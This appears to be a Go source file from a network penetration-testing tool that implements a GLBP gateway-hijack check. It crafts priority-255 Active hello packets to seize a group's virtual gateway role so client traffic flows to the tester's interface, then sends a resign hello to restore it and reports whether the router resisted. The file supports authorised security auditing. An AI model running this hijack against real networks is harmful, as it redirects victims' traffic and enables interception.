// glbp.go implements the GLBP virtual-router hijack check. Impact
// temporary, restore active, affects clients: the hellos with priority 255
// and the active state claim the active virtual gateway role for the
// group, so the clients' gateway traffic goes to the attack leg, and the
// armed resign hello (lowered priority, listen state) hands the role back
// when the run ends. The group takes the full two octets its frame field
// holds, since no vendored source states a narrower range.
//
// The baseline (l2l3-audit) does not carry a GLBP attack. The craft is
// authored from Wireshark's packet-glbp.c at commit
// 1dbb8baf9c5bb2e9501b15cce98cea6a3c0f41a3, lines 137-218 and 289-365.
// What the active gateway does on a higher-priority hello is unverified,
// since no RFC and no vendored source describes the state machine; the
// predicate reads the state the hello TLV carries.

package fh

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	nl "go.aledante.io/FlowSeer/src/edge/netpen/layers"
	"go.aledante.io/FlowSeer/src/edge/netpen/link"
)

// The GLBP timers the check runs on: the hello and hold times the probe's
// own TLV carries (3000 ms and 10000 ms), and the shortest window that
// holds one pre-read and one hello interval after the probe.
const (
	glbpHelloTime = 3 * time.Second
	glbpHoldTime  = 10 * time.Second
	glbpMinWindow = 2 * glbpHelloTime
)

type glbpFinding struct {
	Action   string `json:"action"`
	Group    uint16 `json:"group"`
	Priority uint8  `json:"priority"`
	State    string `json:"state"`
	Restore  string `json:"restore"`
}

// RunGLBP reads the leg for one hello interval for a hello from another
// sender for the target's group in state Active, then arms the resign and
// sends the priority-255 active hello every hello interval until the
// window ends or the predicate matches. The priorities are probe content.
// The predicate is what the active gateway does: a hello from it in a
// state other than Active confirms, and so does its silence for one hold
// time. A hello from it still Active within a hello interval of the
// window's end is resisted, and its silence past a hello interval but
// short of the hold time is pending, because the window was too short to
// decide. No Active hello in the pre-read is pending, and a window under
// 6 s is pending naming the window to pass.
func RunGLBP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldGroup, check.FieldVirtualIP); err != nil {
		return check.Verdict{}, err
	}
	if deps.Observe < glbpMinWindow {
		return check.Pending(fmt.Sprintf("the window %s is shorter than the %s the check needs: pass --observe 15s", deps.Observe, glbpMinWindow)), nil
	}
	addr := deps.AttackLeg.Addr()
	group := *deps.Target.Group
	priority := uint8(255)
	vip := deps.Target.VirtualIP

	// Arm the resign teardown before the first frame and before the
	// pre-read: an actively restored behavior arms a step on every path
	// the runner runs its teardown on, and a listen-state hello at
	// priority 100 from a router that never claimed the group is one
	// more listener.
	resignPkt, err := craftGLBPHello(addr, group, 100, nl.GLBPStateListen, vip)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "glbp: craft resign")
	}
	deps.Teardown.Arm("glbp-resign", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, resignPkt)
	})

	var gateway net.HardwareAddr
	_, pre, err := check.First(ctx, deps.AttackLeg, min(glbpHelloTime, deps.Observe), func(data []byte) bool {
		hello, from, ok := isGLBPHelloFor(data, group, addr.MAC)
		if !ok || hello.State != nl.GLBPStateActive {
			return false
		}
		gateway = from
		return true
	})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "glbp: receive hello")
	}
	if gateway == nil {
		return check.Pending(fmt.Sprintf("no active gateway for group %d in %s", group, pre.Elapsed.Round(time.Millisecond))), nil
	}

	helloPkt, err := craftGLBPHello(addr, group, priority, nl.GLBPStateActive, vip)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "glbp: craft hello")
	}

	lastSeen := time.Now()
	var state nl.GLBPState
	found, obs, err := check.Sustain(ctx, deps.AttackLeg, deps.Observe-pre.Elapsed, glbpHelloTime,
		func(ctx context.Context) error {
			if err := deps.AttackLeg.Send(ctx, helloPkt); err != nil {
				return errs.Wrap(err, "glbp: send hello")
			}
			return nil
		},
		func(data []byte) bool {
			hello, from, ok := isGLBPHelloFor(data, group, addr.MAC)
			if !ok || !bytes.Equal(from, gateway) {
				return false
			}
			lastSeen = time.Now()
			state = hello.State
			return state != nl.GLBPStateActive
		})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "glbp: receive after the hello")
	}

	detail, _ := json.Marshal(glbpFinding{
		Action:   "glbp-hijack",
		Group:    group,
		Priority: priority,
		State:    "active",
		Restore:  "glbp-resign",
	})
	deps.Emitter.Finding("glbp", detail)

	observed := pre.Elapsed + obs.Elapsed
	switch {
	case found != nil:
		return check.Confirmed(fmt.Sprintf("the active gateway for group %d left the active state for state 0x%02x", group, uint8(state)), observed), nil
	case time.Since(lastSeen) >= glbpHoldTime:
		return check.Confirmed(fmt.Sprintf("the active gateway for group %d fell silent for the %s hold time", group, glbpHoldTime), observed), nil
	case time.Since(lastSeen) >= glbpHelloTime:
		return check.Pending(fmt.Sprintf("the active gateway for group %d fell silent after the probe, but the %s window is shorter than the %s hold time: pass --observe %s", group, deps.Observe, glbpHoldTime, glbpHelloTime+glbpHoldTime)), nil
	}
	return check.Resisted(fmt.Sprintf("the active gateway for group %d still sends hellos in state active", group), observed), nil
}

// craftGLBPHello builds a GLBP hello: Ethernet → IPv4 → UDP(3222) → GLBP.
func craftGLBPHello(addr link.Addr, group uint16, priority uint8, state nl.GLBPState, vip net.IP) ([]byte, error) {
	src := addr.MAC
	eth := &layers.Ethernet{
		DstMAC:       glbpDstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    addr.IPv4,
		DstIP:    net.IPv4(224, 0, 0, 102),
	}
	udp := &layers.UDP{
		SrcPort: 3222,
		DstPort: 3222,
	}
	glbp := &nl.GLBP{
		Version:  1,
		Group:    group,
		OwnerMAC: src,
		TLVs: []nl.GLBPTLV{
			{
				Type: 1,
				Hello: &nl.GLBPHello{
					State:          state,
					Priority:       priority,
					HelloTime:      3000,
					HoldTime:       10000,
					AddressType:    1,
					AddressLength:  4,
					VirtualAddress: vip.To4(),
				},
			},
		},
	}
	return craftUDPLayer(eth, ip, udp, glbp)
}
